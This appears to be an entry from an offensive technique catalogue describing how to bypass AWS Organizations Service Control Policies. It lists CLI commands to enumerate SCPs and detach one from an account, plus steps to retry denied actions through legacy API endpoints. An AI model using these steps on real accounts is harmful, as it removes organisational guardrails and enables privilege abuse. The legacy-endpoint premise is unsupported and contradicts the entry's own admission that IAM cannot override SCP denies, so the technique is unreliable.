title: AWS Organizations SCP Bypass — Legacy API Version Evasion
description: AWS Service Control Policies (SCPs) are organization-level guardrails that limit permissions even if IAM policies allow them. SCP enforcement depends on the API version used — pre-2017 XML-based API endpoints may not fully enforce SCPs. Attack: (1) Check if Organizations is configured: aws organizations describe-organization. (2) List SCPs: aws organizations list-policies --filter SERVICE_CONTROL_POLICY. (3) For each SCP, check targets: aws organizations list-targets-for-policy --policy-id POLICY_ID. (4) Describe SCP: aws organizations describe-policy --policy-id POLICY_ID to understand which actions are denied. (5) Attempt the denied action via standard API — it should fail with AccessDenied. (6) Retry the action using an older API version endpoint (e.g., pre-2017 IAM endpoint) or via a different AWS SDK version that may not support SCP. (7) Alternative: if iam:CreatePolicyVersion is allowed, create a new IAM policy that explicitly allows the denied action (IAM policies can't override SCP denies, but some legacy endpoints enforce IAM before SCP). (8) Alternative: if organizations:DetachPolicy is allowed: aws organizations detach-policy --policy-id SCP_ID --target-id ACCOUNT_ID to remove the SCP. (9) Verify bypass by checking resource access.
techniques: List SCPs: aws organizations list-policies --filter SERVICE_CONTROL_POLICY
List SCP targets: aws organizations list-targets-for-policy --policy-id POLICY_ID
Describe SCP: aws organizations describe-policy --policy-id POLICY_ID
Detach SCP: aws organizations detach-policy --policy-id POLICY_ID --target-id ACCOUNT_ID
Use legacy API version: set endpoint_url to older endpoint or use XML-based API call
Verify with: aws iam simulate-principal-policy --policy-source-arn ROLE_ARN --action-names ACTION
indicators: API call returns AccessDenied with SCP reference
prerequisites: AWS credentials in an organization member account
Knowledge of which actions are SCP-denied
Access to older API endpoint or SDK version
